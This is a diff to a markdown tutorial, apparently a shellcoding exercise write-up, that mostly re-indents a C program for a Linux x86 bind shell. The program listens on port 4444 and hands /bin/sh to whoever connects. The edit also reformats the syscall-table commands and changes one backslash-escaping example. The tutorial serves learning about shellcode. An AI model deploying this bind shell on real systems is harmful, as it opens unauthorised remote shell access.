@@ -28,45 +28,47 @@ A bind shell is a shell that binds to a specific port on the target host to list
 
 int main()
 {
-	// Create sockaddr_in struct
-	struct sockaddr_in addr;
-	// AF_INET for IPv4
-	addr.sin_family = AF_INET;
-	// Set port number to 4444
-	addr.sin_port = htons(4444);
-	// Listen on any interface
-	addr.sin_addr.s_addr = INADDR_ANY;
+    // Create sockaddr_in struct
+    struct sockaddr_in addr;
+    // AF_INET for IPv4
+    addr.sin_family = AF_INET;
+    // Set port number to 4444
+    addr.sin_port = htons(4444);
+    // Listen on any interface
+    addr.sin_addr.s_addr = INADDR_ANY;
 
-        // Create the sock
-	// AF_INET for IPv4
-	// SOCK_STREAM for TCP connection
-	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-	
-	// Bind address to sock
-	bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+    // Create the sock
+    // AF_INET for IPv4
+    // SOCK_STREAM for TCP connection
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
-	// Use the created sock to listen for connections
-	listen(sockfd, 0);
+    // Bind address to sock
+    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
 
-	// Accept connections
-	int connfd = accept(sockfd, NULL, NULL);
+    // Use the created sock to listen for connections
+    listen(sockfd, 0);
 
-	for (int i = 0; i < 3; i++)
-        {
-            dup2(connfd, i);
-        }
+    // Accept connections
+    int connfd = accept(sockfd, NULL, NULL);
 
-	// Execute /bin/sh
-	execve("/bin/sh", NULL, NULL);
+    for (int i = 0; i < 3; i++)
+    {
+        dup2(connfd, i);
+    }
 
+    // Execute /bin/sh
+    execve("/bin/sh", NULL, NULL);
 }
 ```
 
 Before starting, a list of linux x86 systemcall can be found in the following files
-* cat /usr/include/asm/unistd_32.h
-
+```bash
+#cat /usr/include/asm/unistd_32.h
+```
 On older distributions the file is stored here:
-* cat /usr/include/i386-linux-gnu/asm/unistd_32.h 
+```bash
+#cat /usr/include/i386-linux-gnu/asm/unistd_32.h 
+```
 
 Now, let's get to work.
 =
@@ -287,7 +289,7 @@ We can now connect to this new port using for example netcat and get our shell:
 
 # Second step: make the port configuration easy
 
-Before explaining the python script used for this task, we need to retrieve the hexadecimal format of our shellcode. But instead of a simple '\x' before our hexadecimal value, we will need two of them '\\x'. 
+Before explaining the python script used for this task, we need to retrieve the hexadecimal format of our shellcode. But instead of a simple '\x' before our hexadecimal value, we will need two of them '\\\x'. 
 
 Why ? Because our python script won't interpret our shellcode without this part.
 
